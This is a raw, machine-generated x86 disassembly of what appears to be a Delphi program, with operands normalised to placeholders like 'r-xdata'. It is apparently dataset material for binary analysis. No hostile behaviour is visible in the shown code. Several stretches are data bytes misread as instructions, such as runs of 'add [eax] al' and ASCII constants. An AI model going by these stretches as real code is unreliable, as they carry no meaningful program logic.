mov eax [ ebp - 0x8 ]
call sub_41af7c
cmp [ ebx + 0x78 ] 0x0
je r-xdata
pop edx
pop eax
jg r-xdata
cmp eax [ esp ]
pop edx
pop eax
ja r-xdata
mov [ ebp - 0xc ] 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41ad38
mov eax [ ebx + 0x78 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
test esi esi
jle r-xdata
jmp r-xdata
mov ecx esi
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
add [ ebp - 0xc ] esi
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x6c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c2dc
mov edx esi
mov eax ebx
call sub_4734b4
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea edx [ eax + edx - 0x1 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x58 ]
mov esi eax
xor ecx ecx
xor edx edx
mov eax [ r-xdata ]
call sub_46e954
test esi esi
sete al
mov [ ebx + 0x69 ] al
xor ecx ecx
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
push 0x2
mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
mov [ ebp - 0x10 ] 0x2746
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_46c228
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x8 ]
call sub_40d490
retn
sub_473138
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_47325a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_408858
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405fc8
mov eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x18 ]
xor ecx ecx
pop eax
call sub_409098
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x20
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b1cc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4731fd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x80 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403368
retn
cmp [ edi + 0x78 ] 0x0
jne r-xdata
test bl bl
je r-xdata
cmp [ edi + 0xac ] 0x0
je r-xdata
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax [ edi + 0xac ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xc ]
mov edx esi
call ebx
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473261
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404188
retn
sub_47326c
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
test cl cl
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_472f28
pop edx
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov [ esp ] eax
sub_4732a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4732e8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
mov edx esi
call sub_404470
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4732ef
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_4732f7
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_473476
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
push 0x0
push 0x0
mov eax esi
call sub_41ad38
mov eax esi
call sub_41ad18
add ebx eax
mov [ ebp - 0x10 ] ebx
mov eax esi
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
xor eax eax
push ebp
push sub_473459
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47343a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xa8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov cl 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_47326c
mov eax esi
call sub_41ad18
mov ebx [ ebp - 0x10 ]
sub ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473441
lea eax [ ebp - 0xc ]
call sub_40d490
retn
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_472f28
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov eax esi
call sub_41ad18
push eax
mov eax [ ebp - 0x10 ]
pop edx
sub eax edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xa8 ]
call sub_46dd30
mov ebx eax
test ebx ebx
je r-xdata
sub_473488
push ebx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x69 ] 0x1
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x78 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x44 ]
sub_4734b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
jle r-xdata
cmp eax 0x0
jbe r-xdata
pop esi
pop ebx
retn
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push 0x1
mov esi [ ebx + 0xb0 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_472f28
mov eax ebx
call sub_473540
jmp r-xdata
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
push 0x1
mov eax [ ebx + 0xb0 ]
mov edx [ eax + 0x4 ]
mov ecx esi
mov eax ebx
call sub_472f28
mov edx esi
mov eax [ ebx + 0xb0 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_47355c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403338
mov eax [ ebp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4735a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47362a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax edi
mov ecx esi
mov edx [ ebx + 0x4 ]
call sub_404254
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473631
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
sub_473638
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47370d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx esi
mov edi [ ebx + 0x4 ]
mov edx edi
lea eax [ edi + esi ]
call sub_4028e8
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax ebx
call sub_41b428
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473714
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
sub_47371c
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jle r-xdata
mov eax esi
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn 0x4
xor ecx ecx
mov edx eax
test edx edx
jl r-xdata
test cl cl
jne r-xdata
inc edx
mov eax [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x64 ]
add eax 0x2
dec edx
jne r-xdata
mov cl 0x1
jmp r-xdata
cmp si [ eax ]
jne r-xdata
sub_473768
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_473890
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_473866
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_472d9c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_404424
cmp eax 0x3
jle r-xdata
mov eax [ ebx + 0x80 ]
mov edx [ ebp - 0x8 ]
call sub_47072c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47386d
lea eax [ ebp - 0x8 ]
call sub_40d490
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x3
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404684
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov ecx r-xdata
call sub_404470
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x4
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404684
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_408218
test al al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_472d9c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_404424
cmp eax 0x4
jl r-xdata
sub_4738a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4738f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_470838
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4738fd
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4705b4
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
sub_473904
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4739aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4739b1
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404188
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404570
jne r-xdata
inc ebx
dec esi
jne r-xdata
sub_4739f0
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_47355c
mov [ esi + 0x20 ] 0x8000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_473a38
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473ac4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
call sub_473ad4
mov edx eax
mov eax edi
mov ecx esi
call sub_404254
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473acb
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
sub_473ae0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x24 ]
test esi esi
jle r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
add eax esi
call sub_4028e8
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
xor eax eax
mov [ ebx + 0x24 ] eax
sub_473b18
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473bcc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
add [ ebx + 0x24 ] esi
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x20 ]
jl r-xdata
mov eax ebx
call sub_4739dc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473bd3
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
mov eax ebx
call sub_473ae0
sub_473bd8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
sub ax 0x1
jae r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_41b3d8
sub eax [ ebx + 0x24 ]
mov edx [ ebx + 0x24 ]
add edx edi
xor ecx ecx
mov eax ebx
call sub_41b3d8
sub eax [ ebx + 0x24 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_473c10
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_473c35
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473c3c
retn
sub_473c48
xchg esp eax
cmp al 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi + 0xc0047 ] dl
add [ eax ] al
lahf
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] dl
inc ebp
dec ecx
push esp
push 0x64616572
inc ebp
js r-xdata
popad
je r-xdata
jo r-xdata
inc edx
popad
jae r-xdata
inc ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x4000473d
add [ eax ] al
add al dh
insd
inc ecx
add [ eax - 0x2fffbfcb ] bl
or eax 0x35a80042
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0xd ] ch
inc edx
add [ esi + ecx + 0x2b4c0042 ] al
inc eax
add [ eax ] al
imul ebp [ edi + 0x6e ] 0x473cf490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
cmp al 0x47
add [ eax + eax ] cl
add [ eax ] al
dec eax
cmp al 0x47
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax * 2 + 0x68546449 ] bl
jb r-xdata
xor eax 0x35ac0040
inc eax
add [ eax + 0x4035 ] ah
push esp
add [ 0x42644954 ] cl
push cs
inc edx
add [ ebx + ebp + 0x40 ] cl
popad
push esp
jb r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0xe ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
xor eax [ eax ]
sbb al 0x33
inc eax
add al bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
inc edi
add [ eax ] ch
add [ eax ] al
adc al 0x3d
inc edi
add [ eax - 0x2fffbfcb ] bl
or eax 0x35a80042
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
inc edi
add [ edi ] al
or eax 0x42644954
popad
jae r-xdata
push 0x64616572
mov eax eax
jl r-xdata
push esp
push edi
popad
imul esi [ esi + eax * 2 + 0x6f ] r-xdata
pushad
cmp eax 0x47
imul ebp [ esi + 0x61 ] 0x6e416574
mov eax ebx
call sub_4210e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473edd
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax ebx
call sub_4210b0
inc edi
add [ esi + ecx + 0x3ef40042 ] al
inc edi
add al ch
inc edi
add al dh
inc edi
add ah ch
inc edi
add ah ah
inc edi
add [ eax - 0x7bffb8be ] ch
inc edx
inc edi
add [ eax + 0x42 ] dh
inc edi
add [ ebx + ebp + 0x40 ] cl
add [ eax + 0x40 ] ah
inc edi
add [ eax ] dh
inc ecx
inc edi
add [ eax - 0x63ffb8bf ] dl
inc edx
inc edi
add [ eax + 0x3e ] ch
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x4c0040 ] dl
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] edx
push esp
push 0x64616572
dec eax
inc edi
add [ edi ] al
or [ ecx + ecx * 2 + 0x64 ] edx
push esp
push 0x64616572
in al dx
cmp eax 0x3d780047
inc edi
add [ eax ] al
add [ eax ] cl
dec ecx
push esp
push 0x64616572
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_473ed6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xf ] 0x0
je r-xdata
push esp
push 0x64616572
pushad
cmp eax 0x6e4c0047
inc ecx
add [ eax ] al
add [ eax ] cl
dec ecx
push esp
push 0x64616572
add [ eax ] al
in al dx
cmp eax 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ esi ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_473ef4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_474013
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_474002
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4741f8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474009
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
retn
xor eax eax
push ebp
push sub_473fd8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_473fbb
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_4741f8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4741f8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473fc2
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8 ]
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_42102c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
sub_474060
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] bl
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bd38
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] eax
xor eax eax
push ebp
push sub_4740b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420c98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4740f8
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov [ esi + 0xf ] 0x0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420d68
mov eax esi
mov edx [ eax ]
call [ edx + 0x18 ]
lea eax [ esi + 0x44 ]
call sub_40d490
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_474130
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42bdc0
xor eax eax
push ebp
push sub_474186
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4741f8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47418d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42bdc8
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x0
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42102c
sub_474190
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42bdc0
xor eax eax
push ebp
push sub_4741ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4741f8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
